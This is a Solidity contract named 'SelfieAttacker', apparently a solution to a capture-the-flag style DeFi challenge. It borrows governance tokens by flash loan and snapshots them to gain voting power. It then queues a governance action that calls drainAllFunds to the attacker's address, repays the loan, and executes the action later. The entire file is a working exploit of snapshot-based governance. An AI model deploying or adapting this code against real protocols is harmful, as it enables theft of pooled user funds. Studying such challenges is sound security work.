pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external;
    function getActionDelay() external view returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function snapshot() external returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SelfieAttacker {
    using Address for address payable;

    IPool lender;
    IERC20 lptoken;
    IGovernance governance;

    address owner;
    uint256 actionId;

    constructor () public {
        owner = msg.sender;
    }

    function attack(IPool _lender, IERC20 _lptoken, IGovernance _governance) external {
        // require(msg.sender == owner);
        lender = _lender;
        lptoken = _lptoken;
        governance = _governance;

        lender.flashLoan(1500000 ether);
    }

    function drain() external {
        // require(msg.sender == owner);
        governance.executeAction(actionId);
    }

    function receiveTokens(address token, uint256 amount) external {
        lptoken.snapshot();

        bytes memory calld = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );

        actionId = governance.queueAction(address(lender), calld, 0);

        lptoken.transfer(address(lender), amount);
    }
}
